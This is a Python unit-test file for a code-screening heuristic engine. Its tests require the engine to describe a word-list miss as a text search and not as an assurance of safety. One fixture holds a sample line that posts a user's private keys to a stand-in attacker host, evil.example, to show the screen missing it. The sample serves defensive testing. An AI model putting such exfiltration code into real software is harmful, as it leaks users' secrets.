"""
Unit tests for the four source heuristics (formerly "4D Cognitive Engine").

The old suite asserted `report.ethical.rating == "EXCELLENT"` for clean code,
pinning the defect: a regex finding nothing was reported as an assurance
("Zero unconsented telemetry or surveillance mechanisms found"), so code that
POSTs a user's private keys to a remote host scored 100/EXCELLENT while the
literal string `x = "telemetry"` in a comment scored 75.
"""

import unittest
from saleha.core.cognitive_engine import CognitiveEngine, CognitiveStateReport


class TestCognitiveEngine(unittest.TestCase):
    """Test suite for CognitiveEngine temporal, spatial, ethical, and reasoning analysis."""

    def setUp(self):
        self.engine = CognitiveEngine()

    def test_evaluate_clean_code_gets_high_score(self):
        clean_code = (
            "def calculate_total(prices: list[float], tax_rate: float) -> float:\n"
            "    \"\"\"Calculates total price including tax.\"\"\"\n"
            "    return sum(prices) * (1.0 + tax_rate)\n"
        )
        report = self.engine.evaluate_code(clean_code, "calculate.py")
        self.assertIsInstance(report, CognitiveStateReport)
        self.assertGreaterEqual(report.overall_score, 85)
        # `assertEqual(report.ethical.rating, "EXCELLENT")` used to be here.
        # The rating came from one word-list miss; it is not an ethics verdict.
        self.assertEqual(report.ethical.score, 100)

    def test_no_match_is_reported_as_a_word_search_not_an_assurance(self):
        """
        This exfiltrates a user's private keys but avoids the three matched
        words, so the screen sees nothing -- and must say what it checked
        rather than claiming the code is clean.
        """
        exfil = (
            "import requests\n"
            "def collect(user):\n"
            "    requests.post('http://evil.example/c', json=user.private_keys)\n"
        )
        report = self.engine.evaluate_code(exfil, "collect.py")
        obs = " ".join(report.ethical.observations)
        self.assertIn("word list", obs)
        self.assertIn("not an assurance", obs)
        self.assertNotIn("Zero unconsented telemetry", obs)

    def test_summary_does_not_present_itself_as_a_measurement(self):
        report = self.engine.evaluate_code("def f(): pass", "f.py")
        self.assertIn("not a measurement", report.summary)
        self.assertNotIn("Cognitive Health Score", report.summary)

    def test_loop_observation_admits_it_is_a_text_search(self):
        report = self.engine.evaluate_code("def f(): return 1", "f.py")
        self.assertIn("not a complexity analysis",
                      " ".join(report.temporal.observations))

    def test_detects_unconsented_telemetry(self):
        telemetry_code = (
            "def send_metrics():\n"
            "    telemetry.track_user('user_123', action='click')\n"
        )
        report = self.engine.evaluate_code(telemetry_code, "analytics.py")
        self.assertLess(report.ethical.score, 90)
        self.assertTrue(any("telemetry" in o for o in report.ethical.observations))


if __name__ == "__main__":
    unittest.main()
